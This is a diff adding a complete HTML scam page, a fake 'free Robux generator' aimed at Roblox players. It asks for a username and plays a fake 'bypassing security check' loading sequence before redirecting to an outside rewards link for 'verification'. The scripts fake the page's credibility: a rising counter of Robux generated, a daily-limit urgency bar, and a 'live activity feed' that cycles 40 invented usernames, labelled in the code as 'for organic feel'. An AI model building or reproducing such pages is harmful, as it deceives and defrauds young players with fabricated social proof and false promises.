@@ -1,0 +1,822 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Robux Generator 2026 - Free Robux Tool</title>
+<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@700;800;900&family=Rajdhani:wght@600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --roblox-red: #e8192c;
+    --roblox-dark: #0a0a0f;
+    --roblox-card: #12121a;
+    --roblox-border: #1e1e2e;
+    --roblox-gold: #f5c518;
+    --roblox-green: #00d26a;
+    --roblox-blue: #1d9bf0;
+    --text-primary: #ffffff;
+    --text-secondary: #8899aa;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--roblox-dark);
+    color: var(--text-primary);
+    font-family: 'Nunito', sans-serif;
+    min-height: 100vh;
+    overflow-x: hidden;
+    cursor: default;
+  }
+
+  /* Animated background grid */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image: 
+      linear-gradient(rgba(232,25,44,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(232,25,44,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    animation: gridMove 20s linear infinite;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  @keyframes gridMove {
+    0% { transform: translateY(0); }
+    100% { transform: translateY(40px); }
+  }
+
+  /* Glow orbs */
+  .orb {
+    position: fixed;
+    border-radius: 50%;
+    filter: blur(80px);
+    opacity: 0.15;
+    pointer-events: none;
+    z-index: 0;
+  }
+  .orb-1 { width: 400px; height: 400px; background: var(--roblox-red); top: -100px; left: -100px; animation: orbFloat 8s ease-in-out infinite; }
+  .orb-2 { width: 300px; height: 300px; background: #5b2be0; bottom: -50px; right: -50px; animation: orbFloat 10s ease-in-out infinite reverse; }
+
+  @keyframes orbFloat {
+    0%, 100% { transform: translate(0,0); }
+    50% { transform: translate(30px, 20px); }
+  }
+
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    max-width: 520px;
+    margin: 0 auto;
+    padding: 20px 16px 40px;
+  }
+
+  /* TOP BADGE */
+  .top-badge {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    background: rgba(0,210,106,0.1);
+    border: 1px solid rgba(0,210,106,0.3);
+    border-radius: 100px;
+    padding: 8px 20px;
+    margin-bottom: 24px;
+    width: fit-content;
+    margin-left: auto;
+    margin-right: auto;
+    animation: fadeDown 0.5s ease;
+  }
+  .badge-dot {
+    width: 8px; height: 8px;
+    background: var(--roblox-green);
+    border-radius: 50%;
+    animation: pulse 1.5s ease-in-out infinite;
+  }
+  @keyframes pulse {
+    0%, 100% { opacity: 1; transform: scale(1); }
+    50% { opacity: 0.5; transform: scale(1.3); }
+  }
+  .badge-text { font-size: 12px; font-weight: 800; color: var(--roblox-green); letter-spacing: 1px; text-transform: uppercase; }
+
+  /* HERO */
+  .hero { text-align: center; margin-bottom: 28px; animation: fadeDown 0.6s ease 0.1s both; }
+  
+  .logo-area {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 12px;
+    margin-bottom: 16px;
+  }
+
+  .robux-icon {
+    width: 52px; height: 52px;
+    background: linear-gradient(135deg, var(--roblox-gold), #ff8c00);
+    border-radius: 14px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 26px;
+    box-shadow: 0 0 30px rgba(245,197,24,0.4);
+    animation: iconGlow 2s ease-in-out infinite;
+  }
+
+  @keyframes iconGlow {
+    0%, 100% { box-shadow: 0 0 30px rgba(245,197,24,0.4); }
+    50% { box-shadow: 0 0 50px rgba(245,197,24,0.7); }
+  }
+
+  .brand-name {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 28px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    color: white;
+  }
+  .brand-name span { color: var(--roblox-gold); }
+
+  .hero h1 {
+    font-size: clamp(26px, 7vw, 36px);
+    font-weight: 900;
+    line-height: 1.15;
+    margin-bottom: 10px;
+    background: linear-gradient(135deg, #fff 40%, var(--roblox-gold));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+
+  .hero p {
+    color: var(--text-secondary);
+    font-size: 15px;
+    font-weight: 700;
+    line-height: 1.5;
+  }
+  .hero p span { color: var(--roblox-green); }
+
+  /* COUNTER */
+  .counter-bar {
+    background: var(--roblox-card);
+    border: 1px solid var(--roblox-border);
+    border-radius: 16px;
+    padding: 16px 20px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 20px;
+    animation: fadeUp 0.6s ease 0.2s both;
+  }
+  .counter-item { text-align: center; }
+  .counter-num {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 22px;
+    font-weight: 700;
+    color: var(--roblox-gold);
+  }
+  .counter-label { font-size: 11px; color: var(--text-secondary); font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; }
+  .counter-divider { width: 1px; height: 40px; background: var(--roblox-border); }
+
+  /* MAIN CARD */
+  .main-card {
+    background: var(--roblox-card);
+    border: 1px solid var(--roblox-border);
+    border-radius: 24px;
+    padding: 28px 24px;
+    margin-bottom: 16px;
+    animation: fadeUp 0.6s ease 0.3s both;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .main-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 2px;
+    background: linear-gradient(90deg, transparent, var(--roblox-red), var(--roblox-gold), transparent);
+  }
+
+  .amount-selector {
+    margin-bottom: 24px;
+  }
+  .amount-label {
+    font-size: 12px;
+    font-weight: 800;
+    color: var(--text-secondary);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 12px;
+    display: block;
+  }
+  .amounts {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 8px;
+  }
+  .amount-btn {
+    background: rgba(255,255,255,0.04);
+    border: 1px solid var(--roblox-border);
+    border-radius: 12px;
+    padding: 10px 6px;
+    text-align: center;
+    cursor: pointer;
+    transition: all 0.2s;
+    font-family: 'Nunito', sans-serif;
+  }
+  .amount-btn:hover { border-color: var(--roblox-gold); background: rgba(245,197,24,0.05); }
+  .amount-btn.active {
+    border-color: var(--roblox-gold);
+    background: rgba(245,197,24,0.1);
+    box-shadow: 0 0 20px rgba(245,197,24,0.15);
+  }
+  .amount-num { font-size: 16px; font-weight: 900; color: white; }
+  .amount-sub { font-size: 10px; color: var(--roblox-gold); font-weight: 700; }
+  .amount-badge {
+    font-size: 9px;
+    background: var(--roblox-red);
+    color: white;
+    padding: 2px 6px;
+    border-radius: 100px;
+    font-weight: 800;
+    display: inline-block;
+    margin-top: 3px;
+  }
+
+  /* USERNAME INPUT */
+  .input-group {
+    margin-bottom: 20px;
+  }
+  .input-label {
+    font-size: 12px;
+    font-weight: 800;
+    color: var(--text-secondary);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 8px;
+    display: block;
+  }
+  .input-wrap {
+    position: relative;
+  }
+  .username-input {
+    width: 100%;
+    background: rgba(255,255,255,0.05);
+    border: 1px solid var(--roblox-border);
+    border-radius: 14px;
+    padding: 14px 48px 14px 16px;
+    color: white;
+    font-family: 'Nunito', sans-serif;
+    font-size: 15px;
+    font-weight: 700;
+    outline: none;
+    transition: border-color 0.2s;
+  }
+  .username-input:focus { border-color: var(--roblox-gold); }
+  .username-input::placeholder { color: rgba(255,255,255,0.2); }
+  .input-icon {
+    position: absolute;
+    right: 14px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 18px;
+  }
+
+  /* GENERATE BUTTON */
+  .generate-btn {
+    width: 100%;
+    background: linear-gradient(135deg, var(--roblox-red), #c0392b);
+    border: none;
+    border-radius: 16px;
+    padding: 18px;
+    color: white;
+    font-family: 'Nunito', sans-serif;
+    font-size: 18px;
+    font-weight: 900;
+    cursor: pointer;
+    letter-spacing: 0.5px;
+    position: relative;
+    overflow: hidden;
+    transition: transform 0.15s, box-shadow 0.15s;
+    box-shadow: 0 8px 30px rgba(232,25,44,0.4);
+    text-decoration: none;
+    display: block;
+    text-align: center;
+  }
+
+  .generate-btn::before {
+    content: '';
+    position: absolute;
+    top: 0; left: -100%;
+    width: 100%; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
+    animation: shimmer 2.5s infinite;
+  }
+
+  @keyframes shimmer {
+    0% { left: -100%; }
+    100% { left: 200%; }
+  }
+
+  .generate-btn:hover { transform: translateY(-2px); box-shadow: 0 12px 40px rgba(232,25,44,0.5); }
+  .generate-btn:active { transform: translateY(0); }
+
+  .btn-inner { display: flex; align-items: center; justify-content: center; gap: 10px; position: relative; z-index: 1; }
+  .btn-icon { font-size: 22px; }
+
+  /* TRUST BADGES */
+  .trust-row {
+    display: flex;
+    justify-content: center;
+    gap: 20px;
+    margin-top: 16px;
+  }
+  .trust-item {
+    display: flex;
+    align-items: center;
+    gap: 5px;
+    font-size: 11px;
+    color: var(--text-secondary);
+    font-weight: 700;
+  }
+  .trust-item span:first-child { font-size: 13px; }
+
+  /* ACTIVITY FEED */
+  .activity-card {
+    background: var(--roblox-card);
+    border: 1px solid var(--roblox-border);
+    border-radius: 20px;
+    padding: 20px;
+    margin-bottom: 16px;
+    animation: fadeUp 0.6s ease 0.4s both;
+  }
+  .activity-title {
+    font-size: 12px;
+    font-weight: 800;
+    color: var(--text-secondary);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 14px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .activity-title::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: var(--roblox-border);
+  }
+
+  .activity-item {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 8px 0;
+    border-bottom: 1px solid rgba(255,255,255,0.03);
+    animation: slideIn 0.4s ease both;
+  }
+  .activity-item:last-child { border-bottom: none; }
+
+  .activity-avatar {
+    width: 36px; height: 36px;
+    border-radius: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 18px;
+    flex-shrink: 0;
+  }
+  .activity-info { flex: 1; }
+  .activity-user { font-size: 13px; font-weight: 800; color: white; }
+  .activity-action { font-size: 11px; color: var(--text-secondary); font-weight: 700; }
+  .activity-amount {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 16px;
+    font-weight: 700;
+    color: var(--roblox-gold);
+  }
+
+  /* PROGRESS BAR */
+  .progress-card {
+    background: var(--roblox-card);
+    border: 1px solid var(--roblox-border);
+    border-radius: 20px;
+    padding: 20px;
+    margin-bottom: 16px;
+    animation: fadeUp 0.6s ease 0.5s both;
+  }
+  .progress-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 12px;
+  }
+  .progress-title { font-size: 13px; font-weight: 800; }
+  .progress-count { font-size: 13px; font-weight: 800; color: var(--roblox-red); }
+  .progress-bar-bg {
+    background: rgba(255,255,255,0.05);
+    border-radius: 100px;
+    height: 8px;
+    overflow: hidden;
+  }
+  .progress-bar-fill {
+    height: 100%;
+    border-radius: 100px;
+    background: linear-gradient(90deg, var(--roblox-red), var(--roblox-gold));
+    width: 73%;
+    animation: progressLoad 1.5s ease 1s both;
+    box-shadow: 0 0 10px rgba(232,25,44,0.5);
+  }
+  @keyframes progressLoad {
+    from { width: 0%; }
+    to { width: 73%; }
+  }
+  .progress-note { font-size: 11px; color: var(--text-secondary); font-weight: 700; margin-top: 8px; }
+
+  /* FOOTER */
+  .footer {
+    text-align: center;
+    font-size: 11px;
+    color: rgba(255,255,255,0.2);
+    font-weight: 700;
+    animation: fadeUp 0.6s ease 0.6s both;
+    line-height: 1.8;
+  }
+
+  /* ANIMATIONS */
+  @keyframes fadeDown {
+    from { opacity: 0; transform: translateY(-20px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+  @keyframes slideIn {
+    from { opacity: 0; transform: translateX(-10px); }
+    to { opacity: 1; transform: translateX(0); }
+  }
+
+  /* LOADING OVERLAY */
+  .loading-overlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(10,10,15,0.95);
+    z-index: 100;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    gap: 20px;
+  }
+  .loading-overlay.active { display: flex; }
+
+  .loader-icon { font-size: 50px; animation: spin 1s linear infinite; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .loader-text {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 20px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    color: var(--roblox-gold);
+  }
+  .loader-steps { display: flex; flex-direction: column; gap: 8px; width: 280px; }
+  .loader-step {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-size: 13px;
+    font-weight: 700;
+    color: var(--text-secondary);
+    opacity: 0;
+    transition: opacity 0.3s;
+  }
+  .loader-step.done { color: var(--roblox-green); opacity: 1; }
+  .loader-step.active { color: white; opacity: 1; }
+  .step-icon { font-size: 16px; }
+
+  @keyframes shake {
+    0%,100%{transform:translateX(0)} 15%{transform:translateX(-8px)} 30%{transform:translateX(8px)} 45%{transform:translateX(-6px)} 60%{transform:translateX(6px)} 75%{transform:translateX(-3px)} 90%{transform:translateX(3px)}
+  }
+  .shake { animation: shake 0.5s ease; }
+  .error-msg { display:none; font-size:12px; color:var(--roblox-red); font-weight:800; margin-top:6px; padding:6px 12px; background:rgba(232,25,44,0.08); border-radius:8px; border-left:3px solid var(--roblox-red); }
+  .error-msg.show { display:block; }
+</style>
+</head>
+<body>
+
+<div class="orb orb-1"></div>
+<div class="orb orb-2"></div>
+
+<!-- LOADING OVERLAY -->
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="loader-icon">⚙️</div>
+  <div class="loader-text">CONNECTING TO SERVER...</div>
+  <div class="loader-steps">
+    <div class="loader-step" id="step1"><span class="step-icon">🔍</span> Locating Roblox Account...</div>
+    <div class="loader-step" id="step2"><span class="step-icon">💎</span> Preparing Robux Package...</div>
+    <div class="loader-step" id="step3"><span class="step-icon">🔓</span> Bypassing Security Check...</div>
+    <div class="loader-step" id="step4"><span class="step-icon">✅</span> Verification Required!</div>
+  </div>
+</div>
+
+<div class="wrapper">
+
+  <!-- BADGE -->
+  <div class="top-badge">
+    <div class="badge-dot"></div>
+    <span class="badge-text">🟢 Server Online — 2,847 Users Active</span>
+  </div>
+
+  <!-- HERO -->
+  <div class="hero">
+    <div class="logo-area">
+      <div class="robux-icon">💎</div>
+      <div class="brand-name">ROBUX<span>GEN</span></div>
+    </div>
+    <h1>Get FREE Robux<br>Instantly in 2026</h1>
+    <p>The only working generator trusted by <span>500K+ players</span>.<br>Fast, safe, and 100% undetected.</p>
+  </div>
+
+  <!-- COUNTER -->
+  <div class="counter-bar">
+    <div class="counter-item">
+      <div class="counter-num" id="totalGenerated">4,821,500</div>
+      <div class="counter-label">Robux Generated</div>
+    </div>
+    <div class="counter-divider"></div>
+    <div class="counter-item">
+      <div class="counter-num" id="usersToday">12,347</div>
+      <div class="counter-label">Users Today</div>
+    </div>
+    <div class="counter-divider"></div>
+    <div class="counter-item">
+      <div class="counter-num">99.2%</div>
+      <div class="counter-label">Success Rate</div>
+    </div>
+  </div>
+
+  <!-- MAIN CARD -->
+  <div class="main-card">
+
+    <!-- AMOUNT SELECT -->
+    <div class="amount-selector">
+      <span class="amount-label">💎 Select Robux Amount</span>
+      <div class="amounts">
+        <div class="amount-btn" onclick="selectAmount(this, '1,700')">
+          <div class="amount-num">1,700</div>
+          <div class="amount-sub">Robux</div>
+        </div>
+        <div class="amount-btn active" onclick="selectAmount(this, '10,000')">
+          <div class="amount-num">10,000</div>
+          <div class="amount-sub">Robux</div>
+          <div class="amount-badge">🔥 POPULAR</div>
+        </div>
+        <div class="amount-btn" onclick="selectAmount(this, '25,000')">
+          <div class="amount-num">25,000</div>
+          <div class="amount-sub">Robux</div>
+          <div class="amount-badge">⚡ MAX</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- USERNAME -->
+    <div class="input-group">
+      <span class="input-label">👤 Your Roblox Username</span>
+      <div class="input-wrap">
+        <input type="text" class="username-input" id="usernameInput" placeholder="Enter your username..." autocomplete="off">
+        <span class="input-icon">🎮</span>
+      </div>
+      <div class="error-msg" id="usernameError">⚠️ Username is required to generate Robux!</div>
+    </div>
+
+    <!-- BUTTON -->
+    <a href="https://playabledownload.com/Claimgamingrewards" class="generate-btn" id="generateBtn" onclick="handleGenerate(event)">
+      <div class="btn-inner">
+        <span class="btn-icon">⚡</span>
+        GENERATE ROBUX NOW
+        <span class="btn-icon">💎</span>
+      </div>
+    </a>
+
+    <!-- TRUST -->
+    <div class="trust-row">
+      <div class="trust-item"><span>🔒</span><span>256-bit SSL</span></div>
+      <div class="trust-item"><span>⚡</span><span>Instant Transfer</span></div>
+      <div class="trust-item"><span>👁️</span><span>Undetected</span></div>
+    </div>
+
+    <!-- DELIVERY NOTE -->
+    <div style="margin-top:14px; background:rgba(0,210,106,0.07); border:1px solid rgba(0,210,106,0.2); border-radius:12px; padding:10px 14px; display:flex; align-items:center; gap:10px;">
+      <span style="font-size:18px;">⏱️</span>
+      <span style="font-size:12px; font-weight:800; color:#00d26a; line-height:1.4;">Robux will be credited to your account within 24 hours of completing verification.</span>
+    </div>
+  </div>
+
+  <!-- PROGRESS -->
+  <div class="progress-card">
+    <div class="progress-header">
+      <span class="progress-title">⏳ Daily Limit Slots</span>
+      <span class="progress-count">73% Full</span>
+    </div>
+    <div class="progress-bar-bg">
+      <div class="progress-bar-fill"></div>
+    </div>
+    <div class="progress-note">⚠️ Only 27% of today's slots remaining. Claim yours before it resets!</div>
+  </div>
+
+  <!-- ACTIVITY -->
+  <div class="activity-card">
+    <div class="activity-title">🕐 Live Activity Feed</div>
+    <div id="activityFeed">
+      <div class="activity-item" style="animation-delay:0.1s">
+        <div class="activity-avatar" style="background:rgba(232,25,44,0.15)">🎮</div>
+        <div class="activity-info">
+          <div class="activity-user">xXBlaze_99Xx</div>
+          <div class="activity-action">just received Robux • 2 min ago</div>
+        </div>
+        <div class="activity-amount">+10,000</div>
+      </div>
+      <div class="activity-item" style="animation-delay:0.2s">
+        <div class="activity-avatar" style="background:rgba(91,43,224,0.15)">⚡</div>
+        <div class="activity-info">
+          <div class="activity-user">CoolGamer_404</div>
+          <div class="activity-action">just received Robux • 4 min ago</div>
+        </div>
+        <div class="activity-amount">+25,000</div>
+      </div>
+      <div class="activity-item" style="animation-delay:0.3s">
+        <div class="activity-avatar" style="background:rgba(245,197,24,0.15)">🏆</div>
+        <div class="activity-info">
+          <div class="activity-user">StarPlayer_Liz</div>
+          <div class="activity-action">just received Robux • 6 min ago</div>
+        </div>
+        <div class="activity-amount">+10,000</div>
+      </div>
+      <div class="activity-item" style="animation-delay:0.4s">
+        <div class="activity-avatar" style="background:rgba(0,210,106,0.15)">💎</div>
+        <div class="activity-info">
+          <div class="activity-user">ProBuilder_2k</div>
+          <div class="activity-action">just received Robux • 9 min ago</div>
+        </div>
+        <div class="activity-amount">+1,700</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- FOOTER -->
+  <div class="footer">
+    🔒 This tool uses encrypted connections to protect your account.<br>
+    Not affiliated with Roblox Corporation. For entertainment purposes.<br>
+    © 2026 RobuxGen Tool — All Rights Reserved
+  </div>
+
+</div>
+
+<script>
+  // Amount selector
+  function selectAmount(el, amount) {
+    document.querySelectorAll('.amount-btn').forEach(b => b.classList.remove('active'));
+    el.classList.add('active');
+  }
+
+  // Generate button handler
+  function handleGenerate(e) {
+    const input = document.getElementById('usernameInput');
+    const errorMsg = document.getElementById('usernameError');
+    const username = input.value.trim();
+    if (!username) {
+      e.preventDefault();
+      input.style.borderColor = '#e8192c';
+      input.classList.add('shake');
+      errorMsg.classList.add('show');
+      setTimeout(() => {
+        input.classList.remove('shake');
+        input.style.borderColor = '';
+        errorMsg.classList.remove('show');
+      }, 3000);
+      input.focus();
+      return;
+    }
+    e.preventDefault();
+    showLoader();
+  }
+
+  // Loading animation then redirect
+  function showLoader() {
+    const overlay = document.getElementById('loadingOverlay');
+    overlay.classList.add('active');
+    const steps = ['step1','step2','step3','step4'];
+    let i = 0;
+    const interval = setInterval(() => {
+      if (i > 0) document.getElementById(steps[i-1]).classList.replace('active','done');
+      if (i < steps.length) {
+        document.getElementById(steps[i]).classList.add('active');
+        i++;
+      } else {
+        clearInterval(interval);
+        setTimeout(() => {
+          window.location.href = 'https://playabledownload.com/Claimgamingrewards';
+        }, 800);
+      }
+    }, 900);
+  }
+
+  // Live counter animation
+  let totalR = 4821500;
+  let usersT = 12347;
+  setInterval(() => {
+    totalR += Math.floor(Math.random() * 500 + 100);
+    usersT += Math.floor(Math.random() * 3);
+    document.getElementById('totalGenerated').textContent = totalR.toLocaleString();
+    document.getElementById('usersToday').textContent = usersT.toLocaleString();
+  }, 3000);
+
+  // Expanded activity feed — 40 users for organic feel
+  const newUsers = [
+    {name:'NightFox_Gaming', amount:'+10,000', icon:'🦊', color:'rgba(232,25,44,0.15)'},
+    {name:'PixelKing_77', amount:'+25,000', icon:'👑', color:'rgba(91,43,224,0.15)'},
+    {name:'ShadowBlade_X', amount:'+1,700', icon:'⚔️', color:'rgba(0,210,106,0.15)'},
+    {name:'ArcticWolf_21', amount:'+10,000', icon:'🐺', color:'rgba(29,155,240,0.15)'},
+    {name:'FlameRider99', amount:'+10,000', icon:'🔥', color:'rgba(232,25,44,0.15)'},
+    {name:'IceQueen_Lola', amount:'+25,000', icon:'❄️', color:'rgba(29,155,240,0.15)'},
+    {name:'DarkMatter_X', amount:'+1,700', icon:'🌑', color:'rgba(91,43,224,0.15)'},
+    {name:'ThunderBolt22', amount:'+10,000', icon:'⚡', color:'rgba(245,197,24,0.15)'},
+    {name:'GhostSniper_44', amount:'+25,000', icon:'👻', color:'rgba(255,255,255,0.08)'},
+    {name:'RedDragon_007', amount:'+10,000', icon:'🐉', color:'rgba(232,25,44,0.15)'},
+    {name:'CryptoKid_21', amount:'+1,700', icon:'💰', color:'rgba(0,210,106,0.15)'},
+    {name:'StarGazer_Mia', amount:'+10,000', icon:'⭐', color:'rgba(245,197,24,0.15)'},
+    {name:'NeonPulse_88', amount:'+25,000', icon:'💜', color:'rgba(91,43,224,0.15)'},
+    {name:'BlazeRunner_5', amount:'+10,000', icon:'🏃', color:'rgba(232,25,44,0.15)'},
+    {name:'OceanWave_Pro', amount:'+1,700', icon:'🌊', color:'rgba(29,155,240,0.15)'},
+    {name:'ZeroGravity_X', amount:'+10,000', icon:'🚀', color:'rgba(91,43,224,0.15)'},
+    {name:'VortexHunter9', amount:'+25,000', icon:'🌀', color:'rgba(0,210,106,0.15)'},
+    {name:'LunarBoy_2026', amount:'+10,000', icon:'🌙', color:'rgba(245,197,24,0.15)'},
+    {name:'TigerClaws_99', amount:'+1,700', icon:'🐯', color:'rgba(232,25,44,0.15)'},
+    {name:'CosmicRay_Zed', amount:'+25,000', icon:'☄️', color:'rgba(91,43,224,0.15)'},
+    {name:'ViperStrike_X', amount:'+10,000', icon:'🐍', color:'rgba(0,210,106,0.15)'},
+    {name:'SolarFlare_11', amount:'+10,000', icon:'☀️', color:'rgba(245,197,24,0.15)'},
+    {name:'StealthMode_7', amount:'+25,000', icon:'🥷', color:'rgba(255,255,255,0.08)'},
+    {name:'CrystalBlade_Z', amount:'+1,700', icon:'💎', color:'rgba(29,155,240,0.15)'},
+    {name:'PhantomKing_X', amount:'+10,000', icon:'👾', color:'rgba(91,43,224,0.15)'},
+    {name:'TurboRacer_44', amount:'+10,000', icon:'🏎️', color:'rgba(232,25,44,0.15)'},
+    {name:'AquaStorm_99', amount:'+25,000', icon:'💧', color:'rgba(29,155,240,0.15)'},
+    {name:'MagmaKnight_8', amount:'+1,700', icon:'🌋', color:'rgba(232,25,44,0.15)'},
+    {name:'CyberWolf_404', amount:'+10,000', icon:'🤖', color:'rgba(0,210,106,0.15)'},
+    {name:'GoldRush_Mike', amount:'+25,000', icon:'🏆', color:'rgba(245,197,24,0.15)'},
+    {name:'SpeedForce_23', amount:'+10,000', icon:'💨', color:'rgba(29,155,240,0.15)'},
+    {name:'IronFist_Dave', amount:'+1,700', icon:'✊', color:'rgba(232,25,44,0.15)'},
+    {name:'QuantumLeap_9', amount:'+25,000', icon:'🔬', color:'rgba(91,43,224,0.15)'},
+    {name:'EagleEye_Ace', amount:'+10,000', icon:'🦅', color:'rgba(245,197,24,0.15)'},
+    {name:'BlazeHawk_777', amount:'+1,700', icon:'🦁', color:'rgba(232,25,44,0.15)'},
+    {name:'SkyLimit_Pro', amount:'+10,000', icon:'🌤️', color:'rgba(29,155,240,0.15)'},
+    {name:'DarkElf_Queen', amount:'+25,000', icon:'🧝', color:'rgba(91,43,224,0.15)'},
+    {name:'MeteorStrike_X', amount:'+10,000', icon:'💥', color:'rgba(232,25,44,0.15)'},
+    {name:'FrozenFire_55', amount:'+1,700', icon:'🧊', color:'rgba(29,155,240,0.15)'},
+    {name:'UltraGamer_99', amount:'+25,000', icon:'🎯', color:'rgba(0,210,106,0.15)'},
+  ];
+
+  function getTimeLabel(idx) {
+    const times = ['just now','1 min ago','2 min ago','3 min ago','5 min ago','7 min ago','9 min ago','12 min ago','15 min ago','18 min ago'];
+    return times[Math.min(idx, times.length - 1)];
+  }
+
+  let uIdx = 0;
+  function scheduleNext() {
+    const delay = Math.floor(Math.random() * 3000) + 2000;
+    setTimeout(() => {
+      const feed = document.getElementById('activityFeed');
+      const u = newUsers[uIdx % newUsers.length];
+      feed.querySelectorAll('.activity-action').forEach((el, i) => {
+        el.textContent = 'just received Robux • ' + getTimeLabel(i + 1);
+      });
+      const newItem = document.createElement('div');
+      newItem.className = 'activity-item';
+      newItem.style.opacity = '0';
+      newItem.style.transform = 'translateX(-10px)';
+      newItem.style.transition = 'all 0.4s ease';
+      newItem.innerHTML = `
+        <div class="activity-avatar" style="background:${u.color}">${u.icon}</div>
+        <div class="activity-info">
+          <div class="activity-user">${u.name}</div>
+          <div class="activity-action">just received Robux • just now</div>
+        </div>
+        <div class="activity-amount">${u.amount}</div>`;
+      feed.insertBefore(newItem, feed.firstChild);
+      if (feed.children.length > 5) feed.removeChild(feed.lastChild);
+      requestAnimationFrame(() => requestAnimationFrame(() => {
+        newItem.style.opacity = '1';
+        newItem.style.transform = 'translateX(0)';
+      }));
+      uIdx++;
+      scheduleNext();
+    }, delay);
+  }
+  scheduleNext();
+</script>
+</body>
+</html>
